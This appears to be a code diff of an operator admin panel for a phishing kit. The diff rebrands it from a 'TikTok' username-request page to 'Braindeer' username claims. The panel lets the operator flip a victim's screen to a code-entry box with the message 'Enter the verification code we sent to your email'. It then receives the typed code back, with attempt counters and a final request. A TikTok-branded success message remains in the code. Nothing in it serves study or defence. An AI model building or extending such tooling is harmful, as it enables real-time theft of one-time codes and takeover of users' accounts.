@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>TikTok — Username Requests (Admin)</title>
+<title>Braindeer — Claim Requests (Admin)</title>
 <style>
   * { margin:0; padding:0; box-sizing:border-box; }
   body {
@@ -11,18 +11,23 @@
     background:#fff; color:#161823;
   }
   .topbar {
-    height:52px; border-bottom:1px solid #f1f1f2;
+    height:56px; border-bottom:1px solid #f1f1f2;
     display:flex; align-items:center; padding:0 18px;
     position:sticky; top:0; background:#fff; z-index:10;
   }
-  .logo { font-weight:800; font-size:24px; letter-spacing:-1px; display:flex; gap:2px; }
-  .logo .d { color:#fe2c55; }
+  .brand { display:flex; align-items:center; gap:9px; }
+  .mark {
+    width:30px; height:30px; border-radius:8px; background:#161823; color:#25f4ee;
+    display:grid; place-items:center; font-weight:900; font-size:16px;
+    font-family:ui-monospace,Menlo,monospace;
+  }
+  .brand .name { font-weight:800; font-size:18px; letter-spacing:-0.3px; }
+  .brand .name b { color:#fe2c55; }
   .topbar .sub { margin-left:12px; font-size:12px; color:#16182380; }
   .spacer { flex:1; }
   .stats { display:flex; gap:8px; }
   .stat {
-    background:#f8f8f8; border:1px solid #f1f1f2; border-radius:6px;
-    padding:5px 11px; text-align:center;
+    background:#f8f8f8; border:1px solid #f1f1f2; border-radius:6px; padding:5px 11px; text-align:center;
   }
   .stat .n { font-size:16px; font-weight:800; }
   .stat .l { font-size:9px; color:#16182380; text-transform:uppercase; letter-spacing:.4px; }
@@ -34,7 +39,7 @@
   .live .dot { width:7px; height:7px; border-radius:50%; background:#fe2c55; animation:pl 1.6s infinite; }
   @keyframes pl { 0%,100%{opacity:1;} 50%{opacity:.25;} }
 
-  .layout { display:grid; grid-template-columns:340px 1fr; height:calc(100vh - 52px); }
+  .layout { display:grid; grid-template-columns:360px 1fr; height:calc(100vh - 56px); }
   @media (max-width:900px){ .layout{ grid-template-columns:1fr; height:auto; } }
 
   .side { border-right:1px solid #f1f1f2; overflow-y:auto; padding:14px; }
@@ -55,13 +60,14 @@
   .card.sel { border-color:#fe2c55; box-shadow:0 0 0 2px #fe2c5522; }
   .card .top { display:flex; justify-content:space-between; align-items:center; margin-bottom:4px; }
   .card .id { font-size:10px; color:#16182380; font-weight:700; }
-  .card .nm { font-size:14px; font-weight:700; }
-  .card .un { font-size:12px; color:#fe2c55; }
-  .card .em { font-size:12px; color:#16182380; margin-top:2px; }
-  .card .tm { font-size:10px; color:#c8c8cc; margin-top:5px; }
-  .pill {
-    font-size:9px; font-weight:700; padding:2px 8px; border-radius:999px; text-transform:uppercase; letter-spacing:.4px;
+  .card .claim {
+    font-size:14px; font-weight:700; color:#fe2c55;
   }
+  .card .from { font-size:11px; color:#16182380; margin-top:1px; }
+  .card .em { font-size:12px; color:#16182380; margin-top:3px; }
+  .card .nm { font-size:11px; color:#161823cc; margin-top:2px; }
+  .card .tm { font-size:10px; color:#c8c8cc; margin-top:5px; }
+  .pill { font-size:9px; font-weight:700; padding:2px 8px; border-radius:999px; text-transform:uppercase; letter-spacing:.4px; }
   .p-queued { background:#fff1f3; color:#fe2c55; }
   .p-prompted { background:#f1f1f2; color:#161823; }
   .p-code_submitted { background:#e6fffe; color:#0bb8a8; }
@@ -77,6 +83,7 @@
 
   .dh { display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:16px; gap:12px; flex-wrap:wrap; }
   .dh h1 { font-size:21px; font-weight:700; }
+  .dh h1 .to { color:#fe2c55; }
   .dh .s { font-size:13px; color:#16182380; margin-top:2px; }
 
   .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:8px; margin-bottom:18px; }
@@ -84,14 +91,14 @@
   .ic .k { font-size:9px; text-transform:uppercase; letter-spacing:.4px; color:#16182380; margin-bottom:3px; }
   .ic .v { font-size:14px; font-weight:600; word-break:break-all; }
   .ic .v.m { font-family:ui-monospace,Menlo,monospace; letter-spacing:1px; }
+  .ic.claim .v { color:#fe2c55; }
 
   .st { font-size:11px; text-transform:uppercase; letter-spacing:.6px; color:#16182380; margin:20px 0 8px; }
 
   .acts { display:flex; gap:8px; flex-wrap:wrap; margin-bottom:4px; }
   .ab {
     padding:10px 14px; border-radius:6px; border:1px solid #e3e3e4;
-    background:#fff; color:#161823; font-size:13px; font-weight:600; cursor:pointer;
-    font-family:inherit;
+    background:#fff; color:#161823; font-size:13px; font-weight:600; cursor:pointer; font-family:inherit;
   }
   .ab:hover { border-color:#fe2c55; }
   .ab:disabled { opacity:.4; cursor:not-allowed; }
@@ -111,9 +118,7 @@
   .pe textarea:focus { border-color:#fe2c55; }
   .hint { font-size:11px; color:#16182380; margin-top:6px; line-height:1.5; }
 
-  .cdbox {
-    background:#f0fffe; border:1px solid #bff7f2; border-radius:8px; padding:14px 16px; margin-bottom:14px;
-  }
+  .cdbox { background:#f0fffe; border:1px solid #bff7f2; border-radius:8px; padding:14px 16px; margin-bottom:14px; }
   .cdbox .l { font-size:10px; text-transform:uppercase; letter-spacing:.6px; color:#0bb8a8; font-weight:700; margin-bottom:5px; }
   .cdbox .cd { font-family:ui-monospace,Menlo,monospace; font-size:24px; font-weight:800; letter-spacing:5px; }
   .cdbox .mt { font-size:11px; color:#16182380; margin-top:5px; }
@@ -135,13 +140,15 @@
   ::-webkit-scrollbar-thumb { background:#e3e3e4; border-radius:4px; }
   ::-webkit-scrollbar-thumb:hover { background:#c8c8cc; }
 </style>
-<script src="https://sites.super.myninja.ai/_assets/ninja-daytona-script.js"></script>
 </head>
 <body>
 
 <div class="topbar">
-  <div class="logo">TikTok<span class="d">d</span></div>
-  <div class="sub">Username Requests — Admin</div>
+  <div class="brand">
+    <div class="mark">B</div>
+    <div class="name">Brain<b>deer</b></div>
+  </div>
+  <div class="sub">Claim Requests — Admin</div>
   <div class="spacer"></div>
   <div class="stats">
     <div class="stat q"><div class="n" id="cQ">0</div><div class="l">Queued</div></div>
@@ -154,7 +161,7 @@
 
 <div class="layout">
   <div class="side">
-    <h2>Requests</h2>
+    <h2>Username Claims</h2>
     <div class="filters">
       <div class="chip on" data-f="active">Active <span class="c" id="fA">0</span></div>
       <div class="chip" data-f="queued">Queued</div>
@@ -170,7 +177,7 @@
     <div class="de" id="de">
       <div>
         <div class="b">📋</div>
-        <p>Pick a request on the left to view it<br>and control the customer's screen.</p>
+        <p>Pick a claim on the left to view it<br>and control the customer's screen.</p>
       </div>
     </div>
     <div id="det" style="display:none;"></div>
@@ -237,8 +244,8 @@ function renderList(){
     return `<div class="card ${t.id===selId?"sel":""}" data-id="${t.id}">
       ${nd}
       <div class="top"><span class="id">${t.ticketId||t.id}</span><span class="pill p-${t.status}">${s}</span></div>
-      <div class="nm">${esc(t.name||"—")}${cb}</div>
-      <div class="un">@${esc(t.username||"—")}</div>
+      <div class="claim">@${esc(t.name||"—")}${cb}</div>
+      <div class="from">from @${esc(t.username||"—")}</div>
       <div class="em">${esc(t.email||"—")}</div>
       <div class="tm">${ft(t.updatedAt||t.createdAt)}</div>
     </div>`;
@@ -262,14 +269,14 @@ function renderDetail(){
   $("det").innerHTML=`
     <div class="dh">
       <div>
-        <h1>${esc(t.name||"Unknown")}</h1>
-        <div class="s">@${esc(t.username||"")} • ${t.ticketId||t.id} • <span class="pill p-${t.status}">${sLabel}</span></div>
+        <h1>Claiming <span class="to">@${esc(t.name||"—")}</span></h1>
+        <div class="s">from @${esc(t.username||"")} • ${t.ticketId||t.id} • <span class="pill p-${t.status}">${sLabel}</span></div>
       </div>
     </div>
 
     <div class="grid">
-      <div class="ic"><div class="k">Username</div><div class="v">@${esc(t.username||"—")}</div></div>
-      <div class="ic"><div class="k">Name</div><div class="v">${esc(t.name||"—")}</div></div>
+      <div class="ic"><div class="k">Current username</div><div class="v">@${esc(t.username||"—")}</div></div>
+      <div class="ic claim"><div class="k">Claiming</div><div class="v">@${esc(t.name||"—")}</div></div>
       <div class="ic"><div class="k">Email</div><div class="v">${esc(t.email||"—")}</div></div>
       <div class="ic"><div class="k">Attempt</div><div class="v">${att} / 3</div></div>
       <div class="ic"><div class="k">Created</div><div class="v" style="font-size:12px;">${ft(t.createdAt)}</div></div>
@@ -287,7 +294,7 @@ function renderDetail(){
       <div class="st">Control — prompts the customer's screen</div>
       <div class="pe">
         <label>Message shown to customer (optional)</label>
-        <textarea id="cp" placeholder="e.g. We sent a fresh code to your email. Enter it below.">${esc(t.adminPrompt||defPrompt())}</textarea>
+        <textarea id="cp" placeholder="e.g. We sent a fresh code to your email. Enter it below to confirm your new username.">${esc(t.adminPrompt||defPrompt())}</textarea>
         <div class="hint">Pressing a button flips the customer's screen to a code-entry box showing this message. What they type comes back here.</div>
       </div>
       <div class="acts">
@@ -299,7 +306,7 @@ function renderDetail(){
 
       <div class="st">Resolve</div>
       <div class="rr">
-        <input id="rMsg" type="text" placeholder="Message for customer (e.g. 'Username updated!')">
+        <input id="rMsg" type="text" placeholder="Message for customer (e.g. 'Your username is now @new_name!')">
         <button class="ab ok" id="bRes">Mark done</button>
       </div>
     `:`
@@ -322,7 +329,7 @@ function renderDetail(){
   }
 }
 
-function defPrompt(){ return "Enter the verification code we sent to your email."; }
+function defPrompt(){ return "Enter the verification code we sent to your email to confirm your new username."; }
 
 async function act(t,action){
   const prompt=($("cp")?.value||"").trim()||defPrompt();
@@ -332,20 +339,20 @@ async function act(t,action){
   ["bReq","bTry","bFin"].forEach(b=>{ const e=$(b); if(e) e.disabled=true; });
   try {
     await updateDoc(doc(db,"tickets",t.id),{
-      adminAction:action, adminPrompt:prompt, attempt,
+      adminAction:action, adminPrompt:prompt, attempt:att,
       status:"prompted", clientCode:null, clientCodeAt:null,
       updatedAt:serverTimestamp(),
-      [`log_${Date.now()}`]:{action,attempt,at:new Date().toISOString()}
+      [`log_${Date.now()}`]:{action,attempt:att,at:new Date().toISOString()}
     });
   } catch(e){ alert("Failed: "+e.message); }
   renderDetail();
 }
 
 async function resolve(t){
-  const msg=($("rMsg")?.value||"").trim()||"Your username has been updated. Thanks for using TikTok!";
+  const msg=($("rMsg")?.value||"").trim()||("Your TikTok username has been changed to @" + (t.name||"") + "!");
   try {
     await updateDoc(doc(db,"tickets",t.id),{
-      status:"resolved", resolutionMessage:msg, resolutionTitle:"All set!",
+      status:"resolved", resolutionMessage:msg, resolutionTitle:"Username changed!",
       adminAction:null, updatedAt:serverTimestamp(),
       [`log_${Date.now()}`]:{action:"resolved",at:new Date().toISOString()}
     });
@@ -362,7 +369,7 @@ async function reopen(t){
 
 function buildLog(t){
   const rows=[];
-  if(t.createdAt) rows.push({t:ft(t.createdAt),e:"Request created — customer submitted email"});
+  if(t.createdAt) rows.push({t:ft(t.createdAt),e:`Claim created — @${esc(t.username||"")} → @${esc(t.name||"")}`});
   Object.keys(t).filter(k=>k.startsWith("log_")).sort().forEach(k=>{
     const l=t[k];
     const lbl={request_code:"Requested code from email",try_again:"Asked to try again",request_code_final:"Requested code (FINAL)",resolved:"Marked done"}[l.action]||l.action;
